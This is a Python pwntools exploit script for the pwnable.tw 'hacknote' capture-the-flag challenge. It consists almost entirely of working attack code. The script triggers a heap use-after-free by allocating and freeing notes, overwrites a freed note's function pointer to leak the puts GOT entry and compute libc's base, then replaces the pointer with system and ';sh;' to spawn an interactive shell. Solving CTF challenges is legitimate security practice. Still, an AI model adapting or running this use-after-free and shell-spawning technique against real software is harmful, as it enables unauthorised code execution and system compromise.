from pwn import *

def start():
    global p
    if args.REMOTE:
        p = remote("chall.pwnable.tw", 10102)
    else:
        p = elf.process()

context(os="linux")
context.binary = elf = ELF("./hacknote")
libc = ELF("./libc_32.so.6")
start()


libc_system = libc.symbols["system"]
libc_puts = libc.symbols["puts"]

addr_puts_got = elf.got["puts"]
addr_print_func = 0x804862b


def add_note(size, contents):
    p.send(b"1\n")
    p.recvuntil(b"Note size :")
    p.send(str(size))
    p.recvuntil(b"Content :")
    p.send(contents)
    p.recvuntil(b"Success !\n")
    skip_menu()

def delete_note(index):
    p.send(b"2")
    p.recvuntil(b"Index :")
    p.send(str(index))
    p.recvuntil(b"Success")
    skip_menu()

def print_note(index):
    p.send(b"3")
    p.recvuntil(b"Index :")
    p.send(str(index) + "\n")

def skip_menu():
    p.recvuntil(b"----------------------")
    p.recvuntil(b"----------------------")
    p.recvuntil(b"----------------------\n")


# leak the libc base
# malloc note0
add_note(8, b"A"*2)
# malloc note1
add_note(8, b"A"*2)

# free note1
delete_note(1)
# free note0
delete_note(0)

# malloc note2
add_note(32, b"A"*10)

# malloc note3 and overwrites note1 struct
add_note(8, p32(addr_print_func) + p32(addr_puts_got))

# print note1
print_note(1)

leaked_addr = u32(p.recv(4))
libc_base = leaked_addr - libc_puts
system_addr = libc_base + libc_system

log.info(f"leaked libc base: {hex(libc_base)}")

# free note3
delete_note(3)

# malloc note4 to spawn shell
add_note(8, p32(system_addr) + b";sh;")

p.write(b"3")
p.recvuntil(b"Index :")
p.write(b"1")

p.interactive()
